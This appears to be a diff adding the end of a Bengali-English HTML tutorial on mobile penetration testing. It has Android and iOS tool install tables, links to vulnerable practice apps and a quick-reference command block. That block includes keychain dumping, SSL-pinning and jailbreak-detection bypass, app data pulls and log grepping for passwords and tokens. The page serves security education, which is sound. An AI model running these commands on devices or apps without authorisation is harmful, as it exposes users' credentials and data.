+        <tr><td><strong>apktool</strong></td><td>APK decompile/recompile</td><td>apt install apktool</td></tr>
+        <tr><td><strong>jadx / jadx-gui</strong></td><td>DEX → Java decompile</td><td>apt install jadx</td></tr>
+        <tr><td><strong>dex2jar</strong></td><td>DEX → JAR convert</td><td>apt install dex2jar</td></tr>
+        <tr><td><strong>ADB</strong></td><td>Device control</td><td>apt install adb</td></tr>
+        <tr><td><strong>Frida</strong></td><td>Dynamic instrumentation</td><td>pip3 install frida-tools</td></tr>
+        <tr><td><strong>Objection</strong></td><td>Frida-based framework</td><td>pip3 install objection</td></tr>
+        <tr><td><strong>Drozer</strong></td><td>Android attack framework</td><td>pip3 install drozer</td></tr>
+        <tr><td><strong>MobSF</strong></td><td>Automated analysis</td><td>Docker</td></tr>
+        <tr><td><strong>Burp Suite</strong></td><td>Traffic intercept</td><td>Free download</td></tr>
+        <tr><td><strong>mitmproxy</strong></td><td>CLI traffic intercept</td><td>pip3 install mitmproxy</td></tr>
+        <tr><td><strong>Genymotion</strong></td><td>Android Emulator</td><td>genymotion.com</td></tr>
+        <tr><td><strong>AndroGuard</strong></td><td>Python APK analysis</td><td>pip3 install androguard</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s si">iOS Tools সম্পূর্ণ তালিকা</h2>
+    <table>
+      <thead><tr><th>টুল</th><th>কাজ</th><th>Install</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Frida</strong></td><td>Dynamic instrumentation</td><td>pip3 install frida-tools</td></tr>
+        <tr><td><strong>Objection</strong></td><td>iOS runtime analysis</td><td>pip3 install objection</td></tr>
+        <tr><td><strong>class-dump</strong></td><td>Obj-C class headers</td><td>Homebrew</td></tr>
+        <tr><td><strong>Hopper</strong></td><td>ARM disassembler</td><td>hopperapp.com</td></tr>
+        <tr><td><strong>iProxy</strong></td><td>USB port forwarding</td><td>Homebrew</td></tr>
+        <tr><td><strong>frida-ios-dump</strong></td><td>Decrypt IPA</td><td>GitHub</td></tr>
+        <tr><td><strong>Cycript</strong></td><td>Obj-C runtime</td><td>Cydia</td></tr>
+        <tr><td><strong>MobSF</strong></td><td>Automated analysis</td><td>Docker</td></tr>
+        <tr><td><strong>plutil</strong></td><td>plist analysis</td><td>Built-in macOS</td></tr>
+        <tr><td><strong>iMazing</strong></td><td>iOS device manager</td><td>imazing.com</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s sb">Practice Apps — Learning Platform</h2>
+    <table>
+      <thead><tr><th>App</th><th>Platform</th><th>ডাউনলোড</th></tr></thead>
+      <tbody>
+        <tr><td><strong>DIVA Android</strong></td><td>Android</td><td>GitHub: payatu/diva-android</td></tr>
+        <tr><td><strong>InsecureBankv2</strong></td><td>Android</td><td>GitHub: dineshshetty/Android-InsecureBankv2</td></tr>
+        <tr><td><strong>GoatDroid</strong></td><td>Android</td><td>GitHub: jackMannino/OWASP-GoatDroid</td></tr>
+        <tr><td><strong>Damn Vulnerable iOS App</strong></td><td>iOS</td><td>GitHub: prateek147/DVIA-v2</td></tr>
+        <tr><td><strong>iGoat</strong></td><td>iOS</td><td>OWASP iGoat project</td></tr>
+        <tr><td><strong>HackTheBox Mobile</strong></td><td>Both</td><td>hackthebox.com</td></tr>
+        <tr><td><strong>InjuredAndroid</strong></td><td>Android</td><td>GitHub: B3nac/InjuredAndroid</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s sb">Quick Reference — সব কমান্ড একসাথে</h2>
+    <div class="code both">
+<span class="c"># ══ Android Quick Commands ══</span>
+adb devices                              <span class="c"># Device check</span>
+adb shell pm list packages | grep target <span class="c"># App খোঁজো</span>
+adb shell am start -n pkg/.Activity      <span class="c"># Activity launch</span>
+adb pull /data/data/pkg/ ./              <span class="c"># Data pull</span>
+adb logcat | grep -i "pass\|token"       <span class="c"># Log monitor</span>
+apktool d app.apk -o decoded/           <span class="c"># Decompile</span>
+jadx-gui app.apk                         <span class="c"># GUI decompile</span>
+objection -g com.target.app explore      <span class="c"># Runtime analysis</span>
+frida -U -f com.app -l hook.js          <span class="c"># Frida inject</span>
+
+<span class="c"># ══ iOS Quick Commands ══</span>
+frida-ls-devices                         <span class="c"># Devices list</span>
+frida-ps -U                              <span class="c"># Running processes</span>
+objection -g com.target.app explore      <span class="c"># Explore</span>
+ios jailbreak disable                    <span class="c"># Bypass jailbreak</span>
+ios sslpinning disable                   <span class="c"># SSL bypass</span>
+ios keychain dump                        <span class="c"># Keychain dump</span>
+ios nsuserdefaults get                   <span class="c"># Preferences</span>
+strings AppBinary | grep -i secret       <span class="c"># Static analysis</span>
+    </div>
+
+    <div class="summary">
+      <h3>🎯 Mobile Hacking Methodology</h3>
+      <ul>
+        <li>✅ Setup → Emulator/Device + Frida + Burp</li>
+        <li>✅ Static → APK/IPA decompile → Secrets, Permissions, Manifest</li>
+        <li>✅ Dynamic → ADB/Objection → Storage, Activities, Logs</li>
+        <li>✅ Traffic → SSL Pinning Bypass → API Analysis</li>
+        <li>✅ Runtime → Frida Hook → Auth Bypass, Root/Jailbreak Bypass</li>
+        <li>✅ OWASP → M1-M10 systematically check করো</li>
+        <li>✅ Report → PoC + Screenshot + Impact</li>
+      </ul>
+    </div>
+
+    <div style="text-align:center;margin-top:40px;padding:28px;background:#0a0a0a;border-radius:12px;color:rgba(255,255,255,0.7);">
+      <p style="font-size:17px;margin-bottom:10px;">
+        <span style="color:#3ddc84">🤖 Android</span> &nbsp;+&nbsp;
+        <span style="color:#007aff">🍎 iOS</span> &nbsp;=&nbsp;
+        <span style="color:#af52de">📱 Mobile Security Expert</span>
+      </p>
+      <p>Practice করো DIVA Android ও HackTheBox Mobile Challenge-এ।</p>
+      <p style="margin-top:12px;color:#3ddc84;">🛡️ Test Ethically. Report Responsibly. Keep Learning.</p>
+    </div>
+
+  </div>
+</div>
+
+</body>
+</html>
